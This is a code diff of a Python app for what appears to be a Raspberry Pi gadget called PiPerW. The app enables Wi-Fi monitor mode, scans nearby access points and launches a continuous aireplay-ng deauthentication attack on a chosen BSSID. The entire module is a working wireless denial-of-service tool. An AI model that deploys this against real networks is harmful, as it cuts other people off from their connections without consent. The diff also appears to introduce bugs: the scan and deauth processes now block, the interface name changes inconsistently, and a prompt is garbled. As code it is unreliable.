@@ -1,7 +1,7 @@
 
 from PiPerW.apps.app_interface import AppInterface
-from PiPerW.driver.pheripherals import Pheripherals
-from PiPerW.driver.display import Display
+from PiPerW.pheripherals import Pheripherals
+from PiPerW.display import Display
 from PiPerW.helpers import Log, Config
 from PiPerW.utils.Menu import Menu
 import os, time, subprocess
@@ -36,30 +36,27 @@ class App(AppInterface):
         
         
         self.screen_and_log("Killing conflicting processes")
-        process_kill =  subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
+        process_kill =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
 
         self.screen_and_log("Enabling Monitor Mode")
-        monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']], capture_output=True)
+        monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']])
         
         time.sleep(5)
         
         self.screen_and_log("Checking if monitor mode is enabled")
-        iwconfig_res = subprocess.run(["iwconfig"], capture_output=True, text=True)
-        if "mon" not in iwconfig_res.stdout and "mon" not in iwconfig_res.stderr:
+        res = os.popen("iwconfig").read()
+        if "mon" not in res:
             self.screen_and_log("Error enabling monitor mode not enabled, Error 4","e")
             raise SystemError("Error enabling monitor mode not enabled, Error 4")
         
         
         self.screen_and_log("Scanning for networks\n\nPress any key to stop")
+        scan = subprocess.run(["sudo", "airodump-ng", Config['network']['interface'], "--output-format", "csv", "-w", "PiPerW/tmp"])
         
-        # We must use Popen, otherwise it blocks forever!
-        scan = subprocess.Popen(["sudo", "airodump-ng", Config['network']['interface']+"mon", "--output-format", "csv", "-w", "PiPerW/tmp/scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        self.wait_for_input()
-
+        pheripherals.await_any_key_press()
+        
         self.screen_and_log("Stopping scan")
-        scan.terminate()
-        subprocess.run(["sudo", "killall", "airodump-ng"], capture_output=True)
+        scan = subprocess.run(["sudo", "killall", "airodump-ng"])
         
         
         fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
@@ -75,8 +72,8 @@ class App(AppInterface):
                         self.ap.append(row)
                         
         self.screen_and_log("Select the BSSID to deauth\n\nPress any key to continue")
-        self.wait_for_input()
-
+        pheripherals.await_any_key_press()
+        
         bssid = []
         for i in self.ap:
             bssid.append(i['BSSID'])
@@ -84,8 +81,8 @@ class App(AppInterface):
         selector = Menu(bssid)
         
         display.draw(selector.generate())
-        while not self.is_stopped():
-            key = self.wait_for_input()
+        while True:
+            key = pheripherals.get_key()
             if key == "up":
                 selector.previous()
                 display.draw(selector.generate())
@@ -96,28 +93,33 @@ class App(AppInterface):
                 break
             elif key == "back":
                 self.screen_and_log("Exiting\n\nPress any key to continue")
-                self.wait_for_input()
+                pheripherals.await_any_key_press()
                 return
-
+            
         selected = selector.get_selected()
         self.screen_and_log("Deauthing:\n{}".format(selected))
         
         # change to desired channel
         self.screen_and_log("Changing to desired channel")
-        channel = subprocess.run(["sudo", "iwconfig", Config['network']['interface']+"mon", "channel", self.ap[selected]['channel']], capture_output=True)
+        channel = subprocess.run(["sudo", "iwconfig", Config['network']['interface']+"mon", "channel", self.ap[selected]['channel']])
         
         # deauth        
-        deauth = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", selected, Config['network']['interface']+"mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        deauth = subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", selected, Config['network']['interface']+"mon"])
         
-        self.screen_and_log("Executing deauth\n\nPress back to stop")
+        self.screen_and_log("Executing deauth\n\nPress any key to stop")
         
-        while not self.is_stopped():
-            key = self.wait_for_input()
-            if key == "back" or self.is_stopped():
+        while True:
+            self.screen_and_log("Executing deauth\n\nPress any to stop")
+            pheripherals.await_any_key_press()
+            display.text("Press back again to confirm stop")
+            key = pheripherals.get_key()
+            if key == "back":
                 self.screen_and_log("Stopping deauth")
-                deauth.terminate()
-                subprocess.run(["sudo", "killall", "aireplay-ng"], capture_output=True)
+                subprocess.run(["sudo", "killall", "aireplay-ng"])
                 break
+        
+            
+            
 
         
      
